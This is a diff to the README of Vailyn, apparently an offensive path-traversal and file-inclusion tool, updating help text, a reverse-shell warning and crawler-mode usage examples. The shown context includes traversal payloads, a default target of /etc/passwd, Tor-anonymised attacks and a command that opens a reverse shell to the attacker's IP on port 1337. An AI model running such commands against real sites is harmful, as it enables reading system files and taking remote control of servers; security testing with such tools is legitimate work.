@@ -79,7 +79,7 @@ additional:
   -i F, --check F       File to check for in Phase 1 (df: /etc/passwd)
   -q V, --vic2 V        Attack Target, part 2 (post injection point)
   -t, --tor             Pipe attacks through the Tor anonymity network
-  -k T, --timeout T     Request Timeout
+  -k T, --timeout T     Request Timeout; stable switch for Arjun
   -g, --app             Start Vailyn's Qt5 interface
 ```
 
@@ -92,7 +92,7 @@ INT        attack
 2          path-based attack   (https://site.com/../../../)
 3          cookie-based attack (will grab the cookies for you)
 4          infected post data  (ELEM1=VAL1&ELEM2=../../../)
-5          spider automation   fetch + analyze all URLs from site WIP
+5          spider automation   fetch + analyze all URLs from site
 ```
 
 You also must specify a target to attack. This is done via `-v VIC` and `-q V`, where -v is the part before the injection point, and -q the rest.
@@ -126,7 +126,7 @@ To gain a reverse shell, you can use the `-j A P` argument, where A is your list
 
 > **WARNING**
 >
-> The reverse shell module is NOT production-ready yet! Not all techniques have been implemented yet, and the implemented ones still need polishing.
+> The reverse shell module is NOT production-ready yet! The techniques still need polishing & testing.
 >
 > Also, beware that YOUR IP WILL BE VISIBLE IN THE SERVER LOGS.
 
@@ -175,6 +175,12 @@ will infect DATA2 with the payload
 * Attack, but I want a reverse shell on port 1337:
 `$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -j MY.IP.IS.XX 1337`
 (will start a ncat listener for you)
+
+* Full automation in crawler mode:
+`$ Vailyn -v "http://root-url.site" -a 5 -l ANY ANY` _you can also specify depths, lookup file here_ 
+
+* Full automation, but Arjun needs `--stable`:
+`$ Vailyn -v "http://root-url.site" -a 5 -l ANY ANY -k ANY`
 
 ### Demo
 
